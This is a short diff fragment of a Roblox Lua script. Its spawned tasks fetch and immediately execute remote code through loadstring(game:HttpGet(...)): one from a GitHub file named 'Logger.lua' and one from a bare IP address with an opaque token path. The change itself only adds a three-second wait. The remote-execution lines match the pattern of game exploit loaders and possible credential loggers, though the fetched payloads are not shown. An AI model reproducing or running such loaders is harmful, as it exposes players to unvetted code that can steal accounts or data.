@@ -17,6 +17,8 @@ task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/cxzyue/Blade-Ball/refs/heads/main/Logger.lua"))()
 end)
 
+wait(3)
+
 -- Script 3
 task.spawn(function()
     loadstring(game:HttpGet("http://31.172.87.116/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
